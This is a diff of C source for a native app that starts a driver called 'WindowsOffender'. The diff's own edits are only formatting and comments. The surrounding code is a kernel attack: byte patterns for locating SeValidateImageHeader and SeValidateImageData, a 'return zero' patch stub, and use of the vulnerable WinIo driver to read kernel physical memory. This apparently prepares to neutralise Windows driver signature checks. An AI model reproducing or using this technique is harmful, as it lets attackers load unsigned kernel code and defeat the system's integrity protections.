@@ -8,7 +8,7 @@ The native app responsible for starting the WindowsOffender driver
 PVOID g_ProcessHeap;
 
 BYTE asmReturnZero[] =
-	{
+{
 		0xB8, 0x00, 0x00, 0x00, 0x00, // mov rax, 0
 		0xC3						  // ret
 };
@@ -20,7 +20,7 @@ BYTE validateImageDataPattern[] = {0x48, 0x83, 0xEC, 0x48, 0x48, 0x8B, 0x05, 0x0
 BYTE validateImageHeaderPattern[] = {0x48, 0x8B, 0xC4, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x70, 0x10, 0x57, 0x48, 0x81, 0xEC, 0xA0, 0x00, 0x00, 0x00, 0x33, 0xF6};
 
 VULNERABLE_DRIVER_ENTRY vulnerableDriverList[] =
-	{
+{
 		INITIALIZE_VULNERABLE_DRIVER_ENTRY(L"\\DosDevices\\WinIo", L"WINIO", NULL, NULL, WinIoReadPhysicalMemory, WinIoWritePhysicalMemory),
 };
 
@@ -237,12 +237,12 @@ void NTAPI NtProcessStartup(PPEB pPeb)
 
 	if(NULL == validateImageHeaderPatternAddress)
 	{
-		dbgprintf("Failed to locate SeValidateImageHeader address");
+		dbgprintf("Failed to locate SeValidateImageHeader address\n");
 
 		goto _NtProcessStartup_Cleanup;
 	}	
 
-	// Backup the original function's data
+	// Backup the original SeValidateImageData data
 	if (!pLoadedVulnerableDriver->PhysicalReadRoutine(
 			vulnerableDriverHandle,
 			validateImageDataPatternAddress,
@@ -254,6 +254,7 @@ void NTAPI NtProcessStartup(PPEB pPeb)
 		goto _NtProcessStartup_Cleanup;
 	}
 
+	// Backup the original SeValidateImageHeader data
 	if (!pLoadedVulnerableDriver->PhysicalReadRoutine(
 			vulnerableDriverHandle,
 			validateImageHeaderPatternAddress,
